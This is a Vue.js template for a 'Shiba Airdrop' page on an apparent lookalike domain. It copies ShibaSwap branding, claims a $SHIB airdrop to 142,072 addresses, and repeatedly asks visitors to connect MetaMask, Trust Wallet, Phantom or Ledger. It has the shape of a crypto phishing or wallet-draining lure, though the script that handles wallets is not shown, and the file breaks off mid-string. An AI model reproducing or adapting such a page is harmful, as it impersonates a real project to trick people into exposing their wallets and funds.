<template>
  <div role="banner" class="f-navigation">
    <div class="f-navigation-container">
      <a href="https://shiba-swap.xyz/airdrop/#" class="w-inline-block">
        <img
          src="../assets/logo.png"
          width="124"
          alt=""
          class="f-logo"
          data-savepage-loading="lazy"
        />
      </a>
      <div class="f-navigation-content">
        <nav role="navigation" class="f-navigation-menu">
          <a
            href="https://shibaswap.com/"
            class="button f-navigation-link w-nav-link"
            >ShibaSwap</a
          >
          <a
            href="https://github.com/shytoshikusama/woofwoofpaper/raw/main/SHIBA_INU_WOOF_WOOF.pdf"
            class="f-navigation-link w-nav-link"
            >Docs</a
          >
        </nav>
        <button
          @click="walletsswitch('wallets', true)"
          class="f-navigation-button w-inline-block"
        >
          <div>Connect wallet</div>
        </button>
      </div>
    </div>
  </div>
  <div class="f-section-large">
    <div class="f-container-regular">
      <div class="f-header-grid">
        <div>
          <div class="f-margin-bottom-08">
            <div class="f-heading-detail-small">
              First community REWARD POOL
            </div>
          </div>
          <div class="f-margin-bottom-24">
            <h1 class="f-h1-heading">Shiba Airdrop</h1>
          </div>
          <div class="f-margin-bottom-32">
            <p class="f-paragraph-large">
              The Shiba Token #1 rewards those who have been active in the
              Crypto space community. In total 142,072 addresses have been
              airdropped. A snapshot of addresses was taken on 11/06/2025.
              <br />
              <br />To claim the airdropped $SHIB, you need to connect with
              wallet you own that holds the airdropped token.
            </p>
          </div>
          <div class="f-header-button-wrapper">
            <button
              @click="walletsswitch('wallets', true)"
              class="f-button-neutral w-inline-block"
            >
              <div>Connect Wallet</div>
            </button>
            <a href="#" class="f-button-secondary w-inline-block">
              <div class="text-block">Learn More</div>
            </a>
          </div>
        </div>
        <div class="f-header-image-wrapper-tall">
          <img class="f-image-cover" src="../assets/img.png" alt="" />
        </div>
      </div>
    </div>
    <div class="f-section-large">
      <div class="f-container-regular">
        <div class="f-feature-card-row">
          <div>
            <div class="f-feature-icon-wrapper">
              <img
                src="../assets/volume.png"
                alt=""
                data-savepage-loading="lazy"
              />
            </div>
            <div class="f-margin-bottom-33">
              <div class="f-sub-heading-large">Trading Volume</div>
            </div>
            <p class="f-paragraph-small">
              Weekly $SHIB trading volume hits $1B.
            </p>
          </div>
          <div class="f-feature-card-divider"></div>
          <div>
            <div class="f-feature-icon-wrapper">
              <img
                src="../assets/holders.png"
                alt=""
                data-savepage-loading="lazy"
              />
            </div>
            <div class="f-margin-bottom-33">
              <div class="f-sub-heading-large">Holders</div>
            </div>
            <p class="f-paragraph-small">
              There are around <strong>1.3m</strong>
              SHIB holders
            </p>
          </div>
          <div class="f-feature-card-divider"></div>
          <div>
            <div class="f-feature-icon-wrapper">
              <img
                src="../assets/Market_cap.png"
                alt=""
                data-savepage-loading="lazy"
              />
            </div>
            <div class="f-margin-bottom-33">
              <div class="f-sub-heading-large">Market Cap</div>
            </div>
            <p class="f-paragraph-small">
              SHIB's total market cap surpasses $10B.
            </p>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="f-footer-small">
    <div class="f-container-large">
      <div class="f-footer-bottom">
        <div class="f-footer-brand">
          <a
            data-savepage-href="#"
            href="https://shiba-swap.xyz/airdrop/#"
            class="f-footer-logo-mark w-inline-block"
          >
            <img
              src="../assets/foot_logo.png"
              sizes="(max-width: 479px) 21vw, 48px"
              alt=""
              class="f-footer-logo-xs"
              data-savepage-loading="lazy"
            />
          </a>
          <div class="f-footer-line"></div>
          <p class="f-footer-detail">Copyright ©2025 Shiba</p>
        </div>
        <div class="f-footer-group">
          <div
            id="w-node-f527a4ce-1803-ef47-18d0-72cf9c73a8cb-92824a81"
            class="f-footer-menu"
          >
            <a
              href="https://shibaswap.com/"
              class="f-footer-link w-inline-block"
            >
              <div class="text-block-2">ShibaSwap</div>
            </a>
            <div class="f-footer-vertical-divider"></div>
            <a
              href="https://github.com/shytoshikusama/"
              class="f-footer-link w-inline-block"
            >
              <div class="text-block-3">GitHub</div>
            </a>
            <div class="f-footer-vertical-divider"></div>
            <a
              href="https://t.me/shibpool"
              class="f-footer-link w-inline-block"
            >
              <div class="text-block-4">Telegram</div>
            </a>
            <div class="f-footer-vertical-divider"></div>
            <a
              href="https://coinmarketcap.com/currencies/shiba-inu/"
              class="f-footer-link w-inline-block"
            >
              <div class="text-block-5">CoinMarketCap</div>
            </a>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!-- wallets -->
  <div :class="walletsisshow ? 'walletsbox' : 'scwtw-hidden'">
    <div @click="walletsswitch('wallets', false)" class="walletsbg"></div>
    <div class="walletscon">
      <div class="walletsbc">
        <div class="walletsflex">
          <div class="walletsleft">
            <div class="scwtw-mb-4">
              <svg
                class="scwtw-w-auto"
                width="249"
                height="48"
                viewBox="0 0 249 48"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z"
                  fill="#202020"
                ></path>
                <path
                  d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z"
                  fill="white"
                ></path>
                <path
                  d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z"
                  fill="#202020"
                ></path>
              </svg>
            </div>
            <div class="scwtw-mb-4">
              <p
                class="font-kh-teka-mono scwtw-text-base scwtw-font-normal scwtw-text-color"
              >
                Popular:
              </p>
            </div>
            <div class="walletslist">
              <div class="scwtw-w-full walletsli">
                <button
                  @click="walletsswitch('Metamask', true)"
                  class="walletsitem"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div class="walletslogobox">
                      <img
                        class="walletslogo"
                        src="data:image/webp;base64,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"
                        alt="Metamask"
                      />
                    </div>
                    <div class="scwtw-text-start">
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-color"
                        >Metamask</span
                      >
                    </div>
                  </div>
                  <div
                    class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2"
                  >
                    <div class="walletsgreenbox">
                      <span class="scwtw-uppercase">Recommended</span>
                    </div>

                    <div
                      class="scwtw-hidden scwtw-items-center scwtw-justify-end"
                    >
                      <div>
                        <svg
                          class="scwtw-w-5 sFcwtw-h-5 scwtw-text-color scwtw-animate-spin"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        >
                          <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                        </svg>
                      </div>
                    </div>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full walletsli">
                <button
                  @click="walletsswitch('Trust', true)"
                  class="walletsitem"
                  type="button"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div class="walletslogobox">
                      <img
                        class="walletslogo"
                        src="data:image/webp;base64,UklGRh4FAABXRUJQVlA4WAoAAAAQAAAAdwAAdwAAQUxQSM0AAAABcFzbttJcvCMbWhfRTrBWfhlxGwEpgkUNcXe50yQiJgD3mmGnXBy+9qLshCaeqTXG68PXX49r2kNudiCZuQ/EB577+B5VHKgK9ZY4kBU30gPd9Ip/IBwA0AtGcwNoHSi3Ic04zSRnw2njJAfSSZ9Vv2JVLVktD3////3/A+qS1bJiVfVZ9RNWibPhtHGkGaeZhDanFmDMGRU6gICRj8uUT4rrgo3ATVVwEeotIN4TiXG/m7HIXDyq1cbr77ceNzQ80wy75eJ7LcpOaOJeAFZQOCAqBAAAMBkAnQEqeAB4AD5JIo5FIqIhFMm0iCgEhKRHcX3IMT9H/Kr2O7J/gPwbxyJs+sX8h+XP877ZHihf4D8se4H5h/1m/W73gP7B/M/an6AH9a/p/pK+wn6AH7O+ln+0fwe/uL+0vszarmvyRYT5UxD/t+XH6P/3e9AeiqWKmXiQav4f//u98/v4/K6QilyCPBK67qE/+VjnKMKp3sWn4qDTQfPIVU+/NVj3PteybGb2LshUWI1BQwoYL6Jjhqb/Vh+G5W99LoAqyoC+ZR/qZeJMBZZwAP79wIA5OIwNi9Hl/QM43aY0aNRnyKgTZ2KPksaXAuQP7FyjpUP2Qh95P5rwT+Ja7NKsAMuTSHN/BWckmrf/h672H5bvYZOvb53Fw30znSa/nTZ0EwZANIt2y+ozX8V8Vc20HkQW8By/h5X27WsRAvZvdCsFJNK+o6qSQwU4u3Tv2PmZPHtIM/nxKCVMSFbt5Q4wpkxqq4rvRytNogEmrvGaHSEPyybMs4jQ01DRsFrY/ymHwpbZ9rfZ/qzxQBDvEhzdAfS0h47bq2ODK0YzWz/pHUVSkekHkM+xq0BCLP4H//FUrzdLf/KQwCFC1kVPd+PNd9amA+sgvA+E5GCbnzhWkPMgsoOtCgDQsLxlOJBZ8UjzZ0RlN0IyKfQw43uCjbYEswmy2BbQmk3vgZMaoiHIzoyhNiTd3qG1EyEe2eFM29D2pMfPJeQp6/Ph0pn5I1HOzblkL4VufW1lT3vKmr2iqgfBilLztPjk7UzrJ79hmyAemJ3B0JL+brpfwDGVToLaedSPeyjjA3G/18tCiOqeJ4zK5meAc7yHjpY7b+YB55WYDxFJWFgzmc1UCiHeEsmXTdJ8FdzZrOiQXnPA1Fc+DcGHy8yNTWXdPkw3f0wcFUvNM/7oLX2zrDy4r5SaOuANhB2U2sGMcP4Y3vC0HC9X+tMBowgAV3Zd0UuSXaGy9GPAoQhC9LA96Hul2Vp3cRgZgaGpq/t8JvQ7aILU9e7yVgqfzMkwzWS/4n1aDL2naajCH9k7j5DojhIsd0owFGet3TTuJ6b2y+yPN4PkXs96hxx/GZvtUnuQW5UEp5C2RQex6fV/DIh2XVByKfXn31kZmaTVt59fP6GEAdBx6q5uUcHVivvWJ0OftTYnfgYU7OqHrtttYFH5Wmb/v3H4sYhsEZQuPE+GbmUwTlPQy4qxS8a0gD+4R99/6obUBvWp/9JOgW5QymKQc2sulSGE1Twp+BeIn/l1vf/f4vc8J8iSU2HZGy+hiG9ODXUQGaxjCqXmEiNZF62GgceYWBoxxSjh+W65vBkWGbWU2k35HC32UpXKKOtQMhL1fpUHHu4k9X0rALZ5oHFgEK5SwCYMeJaNXyR+ia6pO8fnNvTKP9Q8Iea+WzHuq7xfANNrVquf7wgAAAAAAA=="
                        alt="Trust Wallet"
                      />
                    </div>
                    <div class="scwtw-text-start">
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-color"
                        >Trust Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2"
                  >
                    <div
                      class="scwtw-hidden scwtw-items-center scwtw-justify-end"
                    >
                      <div>
                        <svg
                          class="scwtw-w-5 sFcwtw-h-5 scwtw-text-color scwtw-animate-spin"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        >
                          <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                        </svg>
                      </div>
                    </div>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full walletsli">
                <button
                  @click="walletsswitch('Phantom', true)"
                  class="walletsitem"
                  type="button"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div class="walletslogobox">
                      <img
                        class="walletslogo"
                        src="data:image/webp;base64,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"
                        alt="Phantom Wallet"
                      />
                    </div>
                    <div class="scwtw-text-start">
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-color"
                        >Phantom Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2"
                  >
                    <div
                      class="scwtw-hidden scwtw-items-center scwtw-justify-end"
                    >
                      <div>
                        <svg
                          class="scwtw-w-5 sFcwtw-h-5 scwtw-text-color scwtw-animate-spin"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        >
                          <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                        </svg>
                      </div>
                    </div>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full walletsli">
                <button
                  @click="walletsswitch('Ledger', true)"
                  class="walletsitem"
                  type="button"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div class="walletslogobox">
                      <img
                        class="walletslogo"
                        src="data:image/webp;base64,UklGRgQDAABXRUJQVlA4WAoAAAAQAAAAdwAAdwAAQUxQSPIAAAABgFttWxXpC4koQdOhEOrQalYqwD40pg8nI6MANNzf+9y/bC8RMQG4XVsX4ijzx5UcQ2M1Hm6aQeYPLoMzjynaaf742ZcPqNJMMdX3KD/T9Oom3c1Ee32D6meqnTrzM1l/Us90q4My8UnFzs+EWwAmM5oM4GbKDnrgNGgrnMR+zaRdYBUiq5hZjcJK5n////v/B3BhJSOrHFnFwCo4Vs4Kp2+rB05XjYaTA8zEKF8AtIw8ABSJTyp3qPjUOPZsPE5Vx6VXZ9A9k17jVuV5eIU768QhVbi/9PnzTW2Bhxp3lU8mgzN4uLYuxCyfR8YYGqtxO1ZQOCDsAQAAEBIAnQEqeAB4AD5JII1EoqIhFcQAKASEtIALaH8HfzmbS/pntV11/5Afhzlx2kLf4zUM/6/0W/8b7QPbv9D/7T3Bv5J/UP9TwAA4aDa2jZqzK3O2rV/wphOaC/on+DHQr87Jqq1WzGL8hZ/TWBeFwR2ODHitf8m/6WYXRxBPDKjjLMZAcJmLEJDccBNLFmBGNjFW7xm1AOAAAP79NmhUeXXD/9SLBhZ5OWP9/079WY96PVLh6/KlEMacFqtTZf3fI28pNfAT+XS1yaDmu/DpG/eS3gJltxDo2dTDpJd04SuW06LEyUwEUu/fRrWHiGgwHeG2qDw1LX5tfIoFQqqAY1DbBGPMxC9T9Orqno+Lswkfo9qdS8RrQLwmmyfGCW31S1P9dD6j4G/sDU4OZjx7FjAykLgmgIjf0neyQecNoG/dTl79e3Iu65Aaa+lvJE59eeGMI+Wbc+KSNeFxlgMDS2zr8WtAOVxDnZ21f0WbHt/zpy1n+aXyOsKHznD5UnY+aILXNUO6A+r